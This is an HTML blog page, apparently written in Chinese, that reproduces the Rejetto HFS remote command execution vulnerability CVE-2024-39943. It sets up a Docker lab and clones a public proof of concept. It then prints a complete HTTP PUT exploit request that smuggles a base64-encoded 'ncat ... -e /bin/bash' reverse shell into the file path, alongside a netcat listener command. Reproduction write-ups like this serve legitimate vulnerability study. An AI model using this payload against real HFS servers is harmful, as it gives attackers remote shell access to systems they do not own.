@@ -1,0 +1,122 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="Rejetto HFS 远程命令执行漏洞(CVE-2024-39943)                           环境搭建       https:&#x2F;&#x2F;github.com&#x2F;rejetto&#x2F;hfs&#x2F;releases&#x2F;tag&#x2F;v0.52.9 下载0.52.9版本 拉取一个镜像 1sudo docker pull 镜像名  在该镜像下新建一个容器，并">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Rejetto HFS 远程命令执行漏洞(CVE-2024-39943)">
+<meta property="og:url" content="https://pidan-007.github.io/2024/07/10/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="PiDan-007">
+<meta property="og:description" content="Rejetto HFS 远程命令执行漏洞(CVE-2024-39943)                           环境搭建       https:&#x2F;&#x2F;github.com&#x2F;rejetto&#x2F;hfs&#x2F;releases&#x2F;tag&#x2F;v0.52.9 下载0.52.9版本 拉取一个镜像 1sudo docker pull 镜像名  在该镜像下新建一个容器，并">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101331716.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101332295.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101334869.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101646018.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407110939490.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101650334.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101710461.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101710339.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101655470.png">
+<meta property="article:published_time" content="2024-07-10T05:20:30.000Z">
+<meta property="article:modified_time" content="2024-07-12T01:57:59.193Z">
+<meta property="article:author" content="PiDan-007">
+<meta property="article:tag" content="CVE-2024-39943漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101331716.png"><title>Rejetto HFS 远程命令执行漏洞(CVE-2024-39943) | PiDan-007</title><link ref="canonical" href="https://pidan-007.github.io/2024/07/10/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PiDan-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">Rejetto HFS 远程命令执行漏洞(CVE-2024-39943)</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2024-07-10</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-07-12</span></span></div></header><div class="post-body">
+        <h1 id="Rejetto-HFS-远程命令执行漏洞-CVE-2024-39943"   >
+          <a href="#Rejetto-HFS-远程命令执行漏洞-CVE-2024-39943" class="heading-link"><i class="fas fa-link"></i></a><a href="#Rejetto-HFS-远程命令执行漏洞-CVE-2024-39943" class="headerlink" title="Rejetto HFS 远程命令执行漏洞(CVE-2024-39943)"></a>Rejetto HFS 远程命令执行漏洞(CVE-2024-39943)</h1>
+      
+        <h4 id="环境搭建"   >
+          <a href="#环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h4>
+      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/rejetto/hfs/releases/tag/v0.52.9" >https://github.com/rejetto/hfs/releases/tag/v0.52.9</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>下载0.52.9版本</p>
+<p>拉取一个镜像</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker pull 镜像名</span><br></pre></td></tr></table></div></figure>
+
+<p>在该镜像下新建一个容器，并确保容器的端口正确映射到宿主机的端口，这里我设置的8081端口，运行之后会直接进入新建的容器</p>
+<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -it -p 8081:8081 --name 容器名 镜像名</span><br></pre></td></tr></table></div></figure>
+
+<p>下载必要的解压工具</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt-get update</span><br><span class="line">apt-get install unzip</span><br></pre></td></tr></table></div></figure>
+
+<p>完成后退出该容器，将刚刚下载的HFS0.52.9版本压缩包复制到该容器当前目录下</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker cp ./hfs-linux.zip 容器id:/</span><br></pre></td></tr></table></div></figure>
+
+<p>再进入容器，解压压缩包后会有一个<code>hfs</code>运行文件和<code>plugin</code>文档</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo docker start 容器id       //先启动容器</span><br><span class="line">sudo docker exec -it 容器id /bin/bash</span><br></pre></td></tr></table></div></figure>
+
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip hfs-linux.zip</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101331716.png" alt="image-20240710133054614"></p>
+<p>运行该文件</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x hfs</span><br><span class="line">./hfs -p 8081 //在8081端口上</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101332295.png" alt="image-20240710133223256"></p>
+<p>接着输入命令来创建用户</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create-admin [your-password]</span><br></pre></td></tr></table></div></figure>
+
+<p>访问返回的链接：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://172.17.0.3/~/admin/%EF%BC%8C%E5%B9%B6%E7%99%BB%E5%BD%95admin/password" >http://172.17.0.3/~/admin/，并登录admin/password</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101334869.png" alt="image-20240710133416783"></p>
+<p>这样就算是搭建成功了</p>
+
+        <h4 id="漏洞复现"   >
+          <a href="#漏洞复现" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4>
+      
+        <h5 id="非admin版"   >
+          <a href="#非admin版" class="heading-link"><i class="fas fa-link"></i></a><a href="#非admin版" class="headerlink" title="非admin版"></a>非admin版</h5>
+      <p>先尝试的网上的，网上的这个也是用的0.52.9版本</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/truonghuuphuc/CVE-2024-39943-Poc.git</span><br><span class="line">cd CVE-2024-39943-Poc</span><br><span class="line">unzip hfs-linux.zip</span><br><span class="line">./hfs --config config.yaml  //运行之后会自动开启admin页面</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101646018.png" alt="image-20240710164656889"></p>
+<p>运行之后设置端口为1080</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config port 1080</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407110939490.png" alt="image-20240711093943385"></p>
+<p>就可以是访问<a href="http://ip:1080了">http://ip:1080了</a></p>
+<p>首先在ubuntu开启端口监听</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></div></figure>
+
+<p>访问<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://172.17.0.1,登录guest/guest%EF%BC%8C%E6%AD%A4%E6%97%B6bp%E4%B8%8A%E4%BC%9A%E6%9C%89%E8%BF%99%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%8C%85" >http://172.17.0.1，登录guest/guest，此时bp上会有这个数据包</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101650334.png" alt="image-20240710165055274"></p>
+<p>将这个数据包发送到repeater</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PUT /tmp/poc&quot;;python3%20-c%20&quot;import%20os;import%20base64;os.system(base64.b64decode(&#x27;bmNhdCAxOTIuMTY4LjE2Mi4xMzIgNDQ0NCAtZSAvYmluL2Jhc2g=&#x27;))/poc11.txt HTTP/1.1</span><br><span class="line">Host: 172.17.0.1</span><br><span class="line">Accept: text/event-stream</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36</span><br><span class="line">Referer: http://172.17.0.1/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Cookie: hfs_http=eyJpcCI6IjE5Mi4xNjguMTYyLjEzMSIsInVzZXJuYW1lIjoiZ3Vlc3QiLCJfZXhwaXJlIjoxNzIwNjg0ODAzMDY2LCJfbWF4QWdlIjo4NjQwMDAwMH0=; hfs_http.sig=075wEnEfJXJZZDCrCCk6yL0hoKA</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 7</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aaaaaaa</span><br></pre></td></tr></table></div></figure>
+
+<p>这个命令是：</p>
+<p><code>ncat 192.168.162.132 4444 -e /bin/bash</code>：目标主机会尝试连接到IP地址 192.168.162.132的4444端口，并启动一个反向Shell</p>
+<p>发送一次之后可以看到已经有poc11.txt文件创建</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101710461.png"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101710339.png" alt="image-20240710171031287"></p>
+<p>再发送一次就能执行命令</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202407101655470.png" alt="image-20240710165537430"></p>
+
+        <h5 id="admin版"   >
+          <a href="#admin版" class="heading-link"><i class="fas fa-link"></i></a><a href="#admin版" class="headerlink" title="admin版"></a>admin版</h5>
+      <p>见视频</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/truonghuuphuc/CVE-2024-39943-Poc" >https://github.com/truonghuuphuc/CVE-2024-39943-Poc</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://pidan-007.github.io">PiDan-007</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://pidan-007.github.io/2024/07/10/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">https://pidan-007.github.io/2024/07/10/HFS%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><div class="post-tags"><span class="post-tags-item"><span class="post-tags-item__icon"><i class="fas fa-tag"></i></span><a class="post-tags-item__link" href="https://pidan-007.github.io/tags/CVE-2024-39943%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">CVE-2024-39943漏洞复现</a></span></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2024/07/08/JumpServer%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"><span class="paginator-prev__text">JumpServer远程代码执行漏洞（CVE-2024-29201&amp;CVE-2024-29202）</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Rejetto-HFS-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2024-39943"><span class="toc-number">1.</span> <span class="toc-text">
+          Rejetto HFS 远程命令执行漏洞(CVE-2024-39943)</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">
+          环境搭建</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">
+          漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%9D%9Eadmin%E7%89%88"><span class="toc-number">1.0.0.2.1.</span> <span class="toc-text">
+          非admin版</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#admin%E7%89%88"><span class="toc-number">1.0.0.2.2.</span> <span class="toc-text">
+          admin版</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/stun-logo.svg" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">13</div><div class="sidebar-ov-state-item__name">Archives</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>PiDan-007</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v6.0.0</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
